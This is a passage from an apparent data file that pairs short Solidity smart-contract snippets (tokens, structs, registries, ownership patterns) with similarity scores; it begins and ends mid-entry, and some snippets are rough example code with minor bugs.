}",0.5958665818330241,"contract TestToken {
    
    mapping (address => uint) public balanceOf;
    
    function () public payable {
        
        balanceOf[msg.sender] = msg.value;
        
    }
    
}"
"contract CA3 {

    struct Student {
        uint age;
        uint income;
        uint score;
        uint attendance;
    }

    Student[] public students;
    uint public studentCount=0;

    function setStudent (uint _age, uint _income, uint _score, uint _attendance) public {
        Student memory tempStudent = Student(_age, _income, _score, _attendance);
        students.push(tempStudent);
    }
}",0.5297076765452629,"contract KyberNetwork {



    function getExpectedRate(

        ERC20 src,

        ERC20 dest,

        uint srcQty

    )

        public

        view

        returns (uint expectedRate, uint slippageRate);



    function trade(

        ERC20 src,

        uint srcAmount,

        ERC20 dest,

        address destAddress,

        uint maxDestAmount,

        uint minConversionRate,

        address walletId

    )

        public

        payable

        returns(uint);

}"
"contract Main is Controlled {  

  using DataSet for *;    
  DataSet.Data d;  

  struct userProduct {  
    address user_address;  
    uint id;  
    string desc;  
    uint price;  
  }  

  userProduct[] public products; 

  event LogNewUserProduct(address user, uint index, string description, uint price);

  function newUserProduct  (  
    address u,
    uint i,
    string d,
    uint p) onlyUser returns (bool added) {

    userProduct memory newProduct;
    newProduct.user_address = msg.sender;
    newProduct.id = i;  
    newProduct.desc= d;
    newProduct.price = p;
    products.push(newProduct);
    LogNewUserProduct(msg.sender, i, d, p);
    return true;
  }  

  function getUserInfo (uint g) constant returns (address ,bytes32, uint ) {  
      for (uint i = 0; i <= products.length; i++) {  
          if (products[i].id == g) {  
             return(products[i].user_address, DataSet.stringToBytes32(products[i].desc), products[i].price);  
          }  
      }  
  }  
}",0.5951096990239905,"contract ElecWhitelist is Ownable {
    
    
    
    uint public communityusersCap = (10**18);
    mapping(address=>uint) public addressCap;

    function ElecWhitelist() public {}

    event ListAddress( address _user, uint _cap, uint _time );

    
    
    function listAddress( address _user, uint _cap ) public onlyOwner {
        addressCap[_user] = _cap;
        ListAddress( _user, _cap, now );
    }

    
    function listAddresses( address[] _users, uint[] _cap ) public onlyOwner {
        require(_users.length == _cap.length );
        for( uint i = 0 ; i < _users.length ; i++ ) {
            listAddress( _users[i], _cap[i] );
        }
    }

    function setUsersCap( uint _cap ) public  onlyOwner {
        communityusersCap = _cap;
    }

    function getCap( address _user ) public constant returns(uint) {
        uint cap = addressCap[_user];
        if( cap == 1 ) return communityusersCap;
        else return cap;
    }

    function destroy() public onlyOwner {
        selfdestruct(owner);
    }
}"
"contract MappingInStruct {

    struct Parent {
        mapping(bytes32 => Child) childrenOfTheMapping;
        Child[] childrenOfTheArray;
    }

    struct Child {
        uint value;
        string name;
    }

    Parent[] parents;

    function newParent() public {
        Parent memory p;
        parents.push(p);
        
    }

    

    function newChildOfTheMapping(uint parent, bytes32 key, uint value, string memory name) public {
        Parent storage p = parents[parent]; 
        Child storage c = p.childrenOfTheMapping[key]; 
        c.value = value;
        c.name = name;
    }

    function getChildOfTheMapping(uint parent, bytes32 key) public view returns(uint value, string memory name) {
        Child storage c = parents[parent].childrenOfTheMapping[key];
        return (c.value, c.name);
    }

    

    function newChildOfTheArray(uint parent, uint value, string memory name) public {
        Child memory c = Child({
            value: value,
            name: name
        });
        Parent storage p = parents[parent];
        p.childrenOfTheArray.push(c);
    }

    function getChildOfTheArray(uint parent, uint child) public view returns(uint value, string memory name) {
        Child storage c = parents[parent].childrenOfTheArray[child];
        return (c.value, c.name);
    }

    
    function parentChildrenOfTheArrayCount(uint parent) public view returns(uint count) {
        count = parents[parent].childrenOfTheArray.length;
    }
}",0.5368401436073148,"contract IterableSet {

    
    struct Element {
        uint256 value;      
        uint256 next;       
        uint256 previous;   
    }

    
    mapping(uint => Element) elements;

    uint256 first;  
    uint256 last;   
    uint256 public size;    

    
    function add(uint256 value) public {
        if (!contains(value)) {
            size += 1;
            Element memory element = Element({
                value: value,
                next: first,
                previous: value
            });

            first = value;
            if (size == 1) {
                last = value;
            } else {
                elements[element.next].previous = value;
            }
            elements[value] = element;
        }
    }

    
    function remove(uint256 value) public {
        if (contains(value)) {
            Element storage element = elements[value];

            if (first == value) {
                first = element.next;
            } else {
                elements[element.previous].next = element.next;
            }
            if (last == value) {
                last = element.previous;
            } else {
                elements[element.next].previous = element.previous;
            }

            size -= 1;
            delete elements[value];
        }
    }

    
    function contains(uint256 value) public view returns (bool) {
        return size > 0 && (first == value || last == value || elements[value].next != 0 || elements[value].previous != 0);
    }

    
    function values() public view returns (uint256[]) {
        uint256[] memory result = new uint256[](size);
        Element storage position = elements[first];
        uint256 i;
        for (i = 0; i < size; i++) {
            result[i] = position.value;
            position = elements[position.next];
        }
        return result;
    }
}"
"contract ProcessAmortization {

    using HitchensOrderStatisticsTreeLib for HitchensOrderStatisticsTreeLib.Tree;

    struct Pending {
        uint amount;
        address user;
        uint validTime;
    }

    mapping(bytes32 => Pending) public pendingStructs; 
    HitchensOrderStatisticsTreeLib.Tree pendingSorted; 

    event LogNewPending(address sender, uint validTime, address user, uint amount, bytes32 key);
    event LogCancelledPending(address sender, address user, bytes32 key);
    event LogProcessedPending(address sender, bytes32 key, uint amount, address user, uint validTime);

    modifier amortizedWork {
        
        if(backlog() > 0) {  
            
            uint first = next(); 
            
            bytes32 key = pendingSorted.valueKeyAtIndex(first, 0); 
            
            Pending storage p = pendingStructs[key]; 
            
            
            
            pendingSorted.remove(key, first);
            emit LogProcessedPending(msg.sender, key, p.amount, p.user, p.validTime);
        }
        _;
    }

    function pendingKey(uint validTime, address user, uint amount) public pure returns(bytes32) {
        return keccak256(abi.encodePacked(validTime, user, amount));
    }

    function insertPendingTransfer(uint validTime, address user, uint amount) public amortizedWork {
        bytes32 key = pendingKey(validTime, user, amount); 
        emit LogNewPending(msg.sender, validTime, user, amount, key);
        pendingSorted.insert(key, validTime); 
        Pending storage p = pendingStructs[key];
        p.amount = amount;
        p.user = user;
        p.validTime = validTime;
    }

    function cancelPendingTransfer(address user, bytes32 key) public amortizedWork {
        emit LogCancelledPending(msg.sender, user, key);
        Pending storage p = pendingStructs[key];
        pendingSorted.remove(key, p.validTime); 
        delete pendingStructs[key];
    }

    function next() public view returns(uint nextTime) {
        nextTime = pendingSorted.first();
    }

    function backlog() public view returns(uint count) {
        count = pendingSorted.below(now);
    }

    function whatTimeIsIt() public view returns(uint) {
        return now;
    }

    

}",0.570904740625218,"contract Ozinex is StandardToken {

    

    string public TOKEN_NAME = ""Ozinex"";

    string public SYMBOL = ""OZI"";

    uint256 public INITIAL_SUPPLY = 500000000;

    uint8 public DECIMALS = 8;



    

    mapping(address => bool) private lockAccount;

    mapping(address => uint256) private frozenTimestamp;



    

    address public owner;



    

    struct Msg {

        uint256 timestamp;

        address sender;

        string content;

    }



    

    Msg[] private msgs;



    mapping(uint => address) public msgToOwner;

    mapping(address => uint) ownerMsgCount;



    

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event SendMsgEvent(address indexed _from, string _content);



    

    constructor() public {

        totalSupply_ = INITIAL_SUPPLY;

        balances[msg.sender] = INITIAL_SUPPLY;

        owner = msg.sender;

    }



    

    modifier onlyOwner {

        require(msg.sender == owner, ""onlyOwner method called by non-owner."");

        _;

    }



    function setOwner(address _newOwner) external onlyOwner {

        owner = _newOwner;

    }



    

    function lock(address _target, bool _freeze) external onlyOwner returns (bool) {

        require(_target != address(0));

        lockAccount[_target] = _freeze;

        return true;

    }



    

    function freezeByTimestamp(address _target, uint256 _timestamp) external onlyOwner returns (bool) {

        require(_target != address(0));

        frozenTimestamp[_target] = _timestamp;

        return true;

    }



    

    function getFrozenTimestamp(address _target) external onlyOwner view returns (uint256) {

        require(_target != address(0));

        return frozenTimestamp[_target];

    }



    

    function transfer(address _to, uint256 _amount) public returns (bool) {

        require(_to != address(0));

        require(lockAccount[msg.sender] != true);

        require(frozenTimestamp[msg.sender] < now);

        require(balances[msg.sender] >= _amount);



        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);



        emit Transfer(msg.sender, _to, _amount);

        return true;

    }

}"
"contract HashToUint {

    uint256 randNonce;

    function test() public returns(uint) {
        randNonce++;
        return uint(keccak256(abi.encodePacked(msg.sender, randNonce, now)));
    }
}",0.5805893309337945,"contract IArtefact {

    function artefacts(uint id) public returns (uint, uint);

    function ownerOf(uint256 _tokenId) public view returns (address);

}"
"contract Store {
  event ItemSet(bytes32 key, bytes32 value);

  string public version;
  mapping (bytes32 => bytes32) public items;

  constructor(string _version) public {
    version = _version;
  }

  function setItem(bytes32 key, bytes32 value) external {
    items[key] = value;
    emit ItemSet(key, value);
  }
}",0.5735112912407528,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract MyContract {
    struct myStruct {
        address id;
    }
    mapping(address => myStruct) myMapping;

    function doSomeStuff(address _tokenId) public view returns(address) {    
        myStruct storage myObj = myMapping[_tokenId];

        return myObj.id;
    }   
}",0.5843239639049556,"contract RegulatorService {



  

  function check(address _token, address _spender, address _from, address _to, uint256 _amount) public returns (uint8);



  

  function messageForReason(uint8 _reason) public view returns (string);

}"
"contract Equipment {
    uint atk;
    uint duration;
    
    
    uint unique;

    function Equipment(uint atk_param, uint duration_param) {
       atk = atk_param;
       duration = duration_param;
    }

    
    function getWeaponOrArmor() constant public (uint) {
       return unique;
    }
}",0.5757853159890822,"contract DateTime {
        function getYear(uint timestamp) public constant returns (uint16);
        function getMonth(uint timestamp) public constant returns (uint8);
        function getDay(uint timestamp) public constant returns (uint8);
}"
"contract A {

  bytes32 public something;

  function setSomething(bytes32 newThing) public {
    something = newThing;
  }
}",0.5819434165911954,"contract Bridge {

    function submitPeriod(

    bytes32 _prevHash, 

    bytes32 _root) 

  public  returns (uint256 newHeight) {}

}"
"contract CA3 {

  uint public test=9;
  struct Student {
    uint16 age;
    uint16 income;
    uint16 score;
    uint16 attendance;
  }
  Student[] public students;
  uint public studentCount=0;

  function setStudent (uint16 _age, uint16 _income, uint16 _score, uint16 _attendance) public {
    test=19;
    Student memory tempStudent = Student({age: _age, income: _income, score: _score, attendance: _attend
ance});
    students.push(tempStudent);
    
  }   
}",0.5382249010914086,"contract MonstersData {
    address coreContract;

    struct Monster {
        
        uint64 birthTime;

        
        
        
        uint16 generation;

        uint16 mID; 
        bool tradeable;

        
        bool female;

        
        bool shiny;
    }

    
    struct MonsterBaseStats {
        uint16 hp;
        uint16 attack;
        uint16 defense;
        uint16 spAttack;
        uint16 spDefense;
        uint16 speed;
    }

    struct Trainer {
        
        uint64 birthTime;

        
        string username;

        
        uint16 currArea;

        address owner;
    }

    
    uint64 creationBlock = uint64(now);
}"
"contract Increment {

    uint epoch;

    mapping(bytes32 => Contract) private contracts; 

    bytes32[] public idList;
    struct Contract { 
            uint data;
            uint vintage;
    }

    function newContract(bytes32 id, uint data, uint vintage) public {
        idList.push(id); 
        Contract storage c = contracts[id];
        c.data = data;
        c.vintage = vintage;
    }


    function setEpoch(uint e) public {
        epoch = e;
    }

    function getContract(uint row) public view returns(bytes32 id, uint data, uint age) {
        require(row <= idList.length);
        id = idList[row];
        Contract storage c = contracts[id];
        data = c.data;
        age = epoch - c.vintage; 
    }
}",0.5760465217431234,"contract Vat {

    struct Urn {
        uint256 ink;   
        uint256 art;   
    }

    struct Ilk {
        uint256 Art;   
        uint256 rate;  
        uint256 spot;  
        uint256 line;  
        uint256 dust;  
    }

    mapping (bytes32 => mapping (address => Urn )) public urns;
    mapping (bytes32 => Ilk)                       public ilks;
    mapping (bytes32 => mapping (address => uint)) public gem;  

    function can(address, address) public view returns (uint);
    function dai(address) public view returns (uint);
    function frob(bytes32, address, address, address, int, int) public;
    function hope(address) public;
    function move(address, address, uint) public;
}"
"contract GameItem is ERC721Full {
    using Counters for Counters.Counter;
    Counters.Counter private _tokenIds;

    constructor() ERC721Full(""GameItem"", ""ITM"") public {
    }

    function awardItem(address player, string memory tokenURI) public returns (uint256) {
        _tokenIds.increment();

        uint256 newItemId = _tokenIds.current();
        _mint(player, newItemId);
        _setTokenURI(newItemId, tokenURI);

        return newItemId;
    }
}",0.5531921294930714,"contract BatchAirDrop {
    MintableTokenIface public token;
    address public owner;

    constructor(MintableTokenIface _token) public {
        owner = msg.sender;
        token = _token;
    }

    function batchSend(uint256 amount, address[] wallets) public {
        require(msg.sender == owner);
        require(amount != 0);
        token.mint(this, amount * wallets.length);
        for (uint256 i = 0; i < wallets.length; i++) {
            token.transfer(wallets[i], amount);
        }
    }
}"
"contract Test {
    uint256 public integer = 100;
    bool[] public array;

    function fill_array() {
        while (integer > 0) {
            bool bit = (integer%2) != 0;
            uint256 quotient = integer/2;
            array.push(bit);
            integer = quotient;
        }
    }
}",0.5543779844585169,"contract ERC20Basic {
    uint256 public totalSupply;
    
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract GroupFactory is Owned {

  RegistryInterface r;

  function setRegistry(address reg) public onlyOwner {
    r = RegistryInterface(reg);
  }

  function createAndRegisterGroup(bytes32 groupName, uint units) public onlyOwner {
    Group g = new Group(groupName, units);
    r.registerGroup(address(g));
  }
",0.5662017554503116,"contract Owned {

  address owner;
  uint last_blocknumber;

  
  function Owned() public {
    owner = msg.sender;
  }
  
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;

  }

  function close() public onlyOwner {
    selfdestruct(msg.sender);
  }
}"
"contract Store {
  event ItemSet(bytes32 key, bytes32 value);

  mapping (bytes32 => bytes32) public items;

  function setItem(bytes32 key, bytes32 value) external {
    items[key] = value;
    emit ItemSet(key, value);
  }
}",0.5867239453487098,"contract IOrderBook {

    

    mapping(bytes32 => bool) public orderSubmitted;



    

    

    

    event OrderSubmitted(

        bytes32 orderHash,

        bytes   orderData

    );



    

    

    

    

    

    

    function submitOrder(

        bytes calldata orderData

        )

        external

        returns (bytes32);

}"
"contract C {
    D d = new D(4); 
    function createD(uint arg) public {
        D newD = new D(arg);
        newD.x();
    }
    function createAndEndowD(uint arg, uint amount) public payable {
        
        D newD = (new D).value(amount)(arg);
        newD.x();
    }
}",0.5557745174389033,"contract WETH is ERC20 {
    function deposit() public payable;
    function withdraw(uint wad) public;
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);
}"
"contract Test {
  uint public myVal;

  event LogNewVal(bool success, uint newVal);

  function doIt(uint newVal) returns(bool success) {
      bool s = setMyVal(newVal);
      LogNewVal(s, newVal);
      return true;
  }

  function setMyVal(uint _newVal) internal returns(bool success){
      myVal = _newVal;
      return true;
  }
}",0.5948915771948771,"contract Token {
    function issue(address _recipient, uint256 _value) returns (bool success) {}
    function issueAtIco(address _recipient, uint256 _value, uint256 _icoNumber) returns (bool success) {}
    function totalSupply() constant returns (uint256 supply) {}
    function unlock() returns (bool success) {}
}"
"contract AirDropEarthDeeds is NFToken {
    bytes4 internal constant MAGIC_ON_ERC721_RECEIVED = 0x150b7a02;

    
    
    function claimPlot(int256 latitude, uint256 longitude) external {
        require (latitude >= -66 && latitude <= 66);
        require (longitude >= 0 && longitude < 360);

        uint tokenId = uint(180 + latitude) * 10000 + longitude;
        address to = msg.sender;
        _mint(to, tokenId);

        if (to.isContract()) 
        {
            bytes4 retval = ERC721TokenReceiver(to).onERC721Received(msg.sender, address(0), tokenId, """");
            require(retval == MAGIC_ON_ERC721_RECEIVED);
        }
    }
}",0.5607125170915515,"contract ERC223MintableToken is ERC223Token {
  uint256 public circulatingSupply;
  function mint(address to, uint256 value) internal returns (bool) {
    uint256 codeLength;

    assembly {
      
      codeLength := extcodesize(to)
    }

    circulatingSupply += value;

    balanceOf[to] += value;  
    if (codeLength > 0) {
      ERC223ReceivingContract receiver = ERC223ReceivingContract(to);
      bytes memory empty;
      receiver.tokenFallback(msg.sender, value, empty);
    }
    Mint(to, value);
    return true;
  }

  event Mint(address indexed to, uint256 value);
}"
"contract Answer { mapping(address => mapping(string => bool)) voters; struct qList { uint count;  mapping(address => mapping(uint => uint)) answer; } mapping(string => qList) questionnaires; function vote(string ID, uint qNum, uint ans) returns (bool) { if(voters[msg.sender][ID]) throw; voters[msg.sender][ID] = true; questionnaires[ID].count += 1; questionnaires[ID].answer[msg.sender][qNum] = ans; return true; } function getNumResult(string ID) constant returns (uint res) { return questionnaires[ID].count; }}",0.5822886086474384,"contract BasicToken is ERC20Basic {
  using SafeMath for uint;

  mapping(address => uint) balances;

  
  modifier onlyPayloadSize(uint size) {
     if(msg.data.length < size + 4) {
       throw;
     }
     _;
  }

  
  function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) returns (bool){
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
	
	return true;
  }

  
  function balanceOf(address _owner) constant returns (uint balance) {
    return balances[_owner];
  }

}"
"contract Hub {

  
  mapping(address => uint) personMap;
  address[] public personIndex;

  address public owner;

  function Hub() {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    if(msg.sender != owner) throw;
    _;
  }

  function createPerson() 
    public
    returns(address newPerson)
  {
    Person p = new Person(msg.sender);              
    personMap[p] = personIndex.length;              
    personIndex.push(p);                            
    return p;
  }

  function deletePerson(address person) 
    onlyOwner
    returns(bool success)
  {
    
    uint location = personMap[person];              
    address personAddress = personIndex[location];  
    
    if(personIndex[personMap[person]] != person) throw; 
    
    personIndex[personMap[person]] = personIndex[personIndex.length-1];
    
    
    personMap[personIndex[personIndex.length-1]] = personMap[person]; 
    
    personIndex.length--;
    
    return true;
  }

  

  function getPersonCount() 
    public
    constant
    returns(uint count)
  {
    return personIndex.length;
  }

  function getPersonAtIndex(uint index)
    public
    constant
    returns(address person)
  {
    return personIndex[index];
  }
}",0.5842001473658868,"contract Ownable {

  address[] public owners;



  event OwnerAdded(address indexed authorizer, address indexed newOwner, uint256 index);



  event OwnerRemoved(address indexed authorizer, address indexed oldOwner);



  

  function Ownable() public {

    owners.push(msg.sender);

    OwnerAdded(0x0, msg.sender, 0);

  }



  

  modifier onlyOwner() {

    bool isOwner = false;



    for (uint256 i = 0; i < owners.length; i++) {

      if (msg.sender == owners[i]) {

        isOwner = true;

        break;

      }

    }



    require(isOwner);

    _;

  }



  

  function addOwner(address newOwner) onlyOwner public {

    require(newOwner != address(0));

    uint256 i = owners.push(newOwner) - 1;

    OwnerAdded(msg.sender, newOwner, i);

  }



  

  function removeOwner(uint256 index) onlyOwner public {

    address owner = owners[index];

    owners[index] = owners[owners.length - 1];

    delete owners[owners.length - 1];

    OwnerRemoved(msg.sender, owner);

  }



  function ownersCount() constant public returns (uint256) {

    return owners.length;

  }

}"
"contract Person {

  
  address public personOwner;

  struct PersonStruct {
    bytes32 encrypted1;
    bytes32 encrypted2;
  }

  PersonStruct p;

  modifier onlyPerson {                       
    if(msg.sender != personOwner) throw;
    _;
  }

  function Person(address person) {
    personOwner = person;                   
    
  }

  function getPerson()
    onlyPerson
    constant
    returns(bytes32, bytes32)
  {
    return(p.encrypted1, p.encrypted2);
  }

  function setPerson(bytes32 part1, bytes32 part2)
    onlyPerson
    returns(bool success)
  {
    p.encrypted1 = part1;
    p.encrypted2 = part2;
    return true;
  }
}",0.5570862444405287,"contract GlobalStorageMultiId { 

	uint256 public regPrice;

	function registerUser(bytes32 _id) payable returns(bool);

	function changeAddress(bytes32 _id , address _newAddress) returns(bool);

	function setUint(bytes32 _id , bytes32 _key , uint _data , bool _overwrite) returns(bool);

	function getUint(bytes32 _id , bytes32 _key) constant returns(uint);

	event Error(string _string);

	event RegisteredUser(address _address , bytes32 _id);

	event ChangedAdd(bytes32 _id , address _old , address _new);

}"
"contract Counter {
    int private count = 0;

    modifier isAdmin() {
        require(msg.sender == 0xYOUR-ADDRESS-HERE);
        _;
    }

    function incrementCounter() public isAdmin {
        count += 1;
    }

    function decrementCounter() public isAdmin {
        count -= 1;
    }

    function getCount() public constant returns (int) {
        return count;
    }
}",0.5991660209970516,"contract Owned {

  address owner;
  uint last_blocknumber;

  
  function Owned() public {
    owner = msg.sender;
  }
  
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;

  }

  function close() public onlyOwner {
    selfdestruct(msg.sender);
  }
}"
"contract A {
    bool aHit;
    bool public aPublicHit;
    bool public aConstructorArg;
    bool cHit;

    function A(bool _aConstructorArg) {
      aHit = true;
      aPublicHit = true;
      aConstructorArg = _aConstructorArg;
    }
}",0.5388414476234374,"contract truth{
    bool public x;
    address payable z;
    
    constructor() public{
        z = msg.sender;
    }
    
    function vote(bool y) public payable{
        x=y;
    }
    
    function transf() public{
        z.transfer(address(this).balance);
    }
}"
"contract UsesMultiReturner {
    function doIt() {
        mr = MultiReturner(0x1234);

        
        var (a, b) = mr.getData();

        
        var (a, b) = mr.getDynamicData();
    }
}",0.5051822307871612,"contract f {
    function a() constant returns (string b){
        return ""tickletickle vac ban in csgo march 10 2017"";
    }
}"
"contract Hub {
  event LogSomething(address contract, bytes32 Id);
  ...
  function logSomething(bytes32 Id);
    LogSomething(msg.sender, Id); 

contract Created{ 
   ...
   function important(bytes32 id) {
      .. 
      Hub.logSomething(Id);",0.5421859094844282,"contract CollectibleExposure {
  function getClosingTime(bytes32 id) constant returns (uint64 value);
  function collect(bytes32 id) returns (uint256 value);
  function close(bytes32 id) payable;
}"
"contract Created{ 
   ...
   function important(bytes32 id) {
      .. 
      Hub.logSomething(Id);",0.5596649946086356,"contract PipInterface {
    function read() public returns (bytes32);
}"
"contract Deck {
   uint8[52] deck;

   function shuffle(bytes randomBytes) {
      if (randomBytes.length < 52) throw;

      uint8[52] memory unshuffled;

      for (uint8 i=0; i < 52; i++) {
          unshuffled[i] = i;
      }

      uint8 cardIndex;

      for (i=0; i < 52; i++) {
          cardIndex = uint8(randomBytes[i]) % (52 - i);
          deck[i] = unshuffled[cardIndex];
          unshuffled[cardIndex] = unshuffled[52 - i - 1];
      }
   }
}",0.5195537452385438,"contract test
{
    event AAA(address indexed sender, uint x);
    
    function aaa(bytes data) public
    {
        uint x = _bytesToUint(data);
        AAA(msg.sender, x);
    }
    
    function _bytesToUint(bytes data) internal view returns (uint) {
        uint num = 0;
        for(uint i = 0; i < data.length; i++) {
            num += uint(data[i]);
            if(i != data.length - 1)
                num *= 256;
        }
        return num;
    }
}"
"contract Ctrt {
    uint public numerator;
    uint public denominator;
    uint public quotient;
    uint public remainder;
    constructor() public {
      numerator = 100;
      denominator = 3;
    }
    function setNumbers(uint _numerator, uint _denominator) public {
      numerator = _numerator;
      denominator = _denominator;
    }
    function safeDiv(uint _numerator, uint _denominator) public {
      quotient = _numerator / _denominator;
      remainder = _numerator - quotient * _denominator;
    }
    function safeDivDefault() public {
      quotient = _numerator / _denominator;
      remainder = _numerator - quotient * _denominator;
      
    }
}",0.5192433010596993,"contract ERC918Interface {

    function getChallengeNumber() public constant returns (bytes32);

    function getMiningDifficulty() public constant returns (uint);

    function getMiningTarget() public constant returns (uint);

    function getMiningReward() public constant returns (uint);



    function mint(uint256 nonce, bytes32 challenge_digest) public returns (bool success);

    event Mint(address indexed from, uint reward_amount, uint epochCount, bytes32 newChallengeNumber);



    address public lastRewardTo;

    uint public lastRewardEthBlockNumber;

}"
"contract HelloUniverse {

  HelloWorld helloWorldContract; 

  constructor(address helloWorldContractAddress) public {
      helloWorldContract = HelloWorld(helloWorldContractAddress);
  }

  function talk() public view returns(string memory) {
    return helloWorldContract.response();
  }
}",0.5357659817014584,"contract TeamBet{
uint minAmount;

string teamName;


BetContract ownerContract;

function showTeam() public view returns(string team){
return teamName;
}

function showOwnerContract() public view returns(address _ownerContract) {

return ownerContract;
}


}"
"contract Numbers {
    int[] public numbers;

    function Numbers() public {
        numbers.push(20);
        numbers.push(32);
    }

    function changeArray(int[] myArray) private {
        myArray[0] = 1;
    }
}",0.5769056483931264,"contract NumberFactory{
    event NumberCreated(address);
    address public last;
 function createNumber(uint _number) public {
     last= new Number(_number);
     NumberCreated(last);
     
    
 } 
}"
"contract CrowdFunding {
    event DeadlineSet(
        address indexed _from,
        uint deadline,
        uint timeNow
    );

    uint deadline;

    function withdrawal() returns(bool) {
        DeadlineSet(msg.sender,deadline,now);
        return true;
    }
}",0.5846761242989189,"contract Burnable {



    function burn(uint256 _value) external returns(bool);

    function burnFrom(address _from, uint256 _value) external returns(bool);



    

    event Burn(address indexed _from, uint256 _value);

}"
"contract Example {

   string public brandName;

   function Example(string yourCompanyName) payable { 
       brandName = yourCompanyName;
   }

}",0.5347012416025969,"contract StableStore {
    
    mapping (address => string) public store;
    
    function setValue(string _value) {
        store[msg.sender]=_value;
    }
}"
"contract TestMyContract {
    MyContract contract = MyContract(DeployedAddresses.MyContract());

    function testCanCallFunction() public {
        myContract.myFunction({from: accounts[0]);
    }
}",0.5751514903282716,"contract PresaleContract is Owned {
    ETToken public tokenContract;

    
    function PresaleContract(address _tokenContract) public {
        tokenContract = ETToken(_tokenContract);
    }
}"
"contract GraphTest {

    using GraphLib for GraphLib.Graph;
    using HitchensUnorderedAddressSetLib for HitchensUnorderedAddressSetLib.Set;
    GraphLib.Graph userGraph;

    struct UserStruct {
        string name;
        
    }

    HitchensUnorderedAddressSetLib.Set userSet;
    mapping(address => UserStruct) private userStructs;

    function newUser(address userId, string memory name) public {
        userSet.insert(userId);
        userStructs[userId].name = name;
        userGraph.insertNode(toBytes32(userId));
    }

    function removeUser(address userId) public {
        userGraph.removeNode(toBytes32(userId)); 
        delete userStructs[userId];
        userSet.remove(userId);
    }

    function updateUser(address userId, string memory name) public {
        require(userSet.exists(userId), ""GraphTest: Unknown user."");
        userStructs[userId].name = name;
    }

    function follow(address sourceId, address targetId, uint importance) public {
        require(userSet.exists(sourceId), ""GraphTest: Unknown follower."");
        require(userSet.exists(targetId), ""GraphTest: Unknown target."");
        userGraph.insertEdge(toBytes32(sourceId), toBytes32(targetId), importance);
    }

    function unfollow(address sourceId, address targetId) public {
        require(userSet.exists(sourceId), ""GraphTest: Unknown follower."");
        require(userSet.exists(targetId), ""GraphTest: Unknown target."");
        userGraph.removeEdge(toBytes32(sourceId), toBytes32(targetId));
    }

    function adjustFollow(address sourceId, address targetId, uint importance) public {
        userGraph.updateEdge(toBytes32(sourceId), toBytes32(targetId), importance);
    }

    

    function userCount() public view returns(uint count) {
        count = userSet.count();
    }

    function userAtIndex(uint index) public view returns(address userId) {
        userId = userSet.keyAtIndex(index);
    }

    function userInfo(address userId) public view returns(string memory name, uint followerCount, uint followingCount) {
        require(userSet.exists(userId), ""GraphTest: Unknown user."");
        (followerCount, followingCount) = userGraph.node(toBytes32(userId));
        name = userStructs[userId].name;
    }

    function userFollowerAtIndex(address userId, uint index) public view returns(address followerId, uint importance) {
        require(userSet.exists(userId), ""GraphTest: Unknown user."");
        bytes32 edgeId = userGraph.nodeSourceEdgeAtIndex(toBytes32(userId), index);
        (bytes32 source, uint weight) = userGraph.edgeSource(edgeId);
        importance = weight;
        followerId = toAddress(source);
    }

    function userFollowingAtIndex(address userId, uint index) public view returns(address followingId, uint importance) {
        require(userSet.exists(userId), ""GraphTest: Unknown user."");
        bytes32 edgeId = userGraph.nodeTargetEdgeAtIndex(toBytes32(userId), index);
        (bytes32 target, uint weight) = userGraph.edgeTarget(edgeId);
        importance = weight;
        followingId = toAddress(target);
    }

    

    

    

    function toBytes32(address a) private pure returns(bytes32) {
        return bytes32(uint(uint160(a)));
    }

    function toAddress(bytes32 b) private pure returns(address) {
        return address(uint160(uint(b)));
    }
}",0.5384273840591258,"contract AstraNetwork is IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private amount_release = 10**27;

    address private anx_address;

    function _issueTokens(address _to, uint256 _amount) internal {
        require(_balances[_to] == 0);
        _balances[_to] = _balances[_to].add(_amount);
        emit Transfer(address(0), _to, _amount);
    }
    constructor (
      address _ANXAddress
    ) public {
        _name = ""Astra Network Token"";
        _symbol = ""ANX"";
        _decimals = 18;
        _totalSupply = 10**27;
        anx_address = _ANXAddress;

        _issueTokens(anx_address, amount_release);
    }
    
    function name() public view returns (string memory) {
        return _name;
    }

    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), ""ERC20: transfer from the zero address"");
        require(recipient != address(0), ""ERC20: transfer to the zero address"");

        _balances[sender] = _balances[sender].sub(amount);
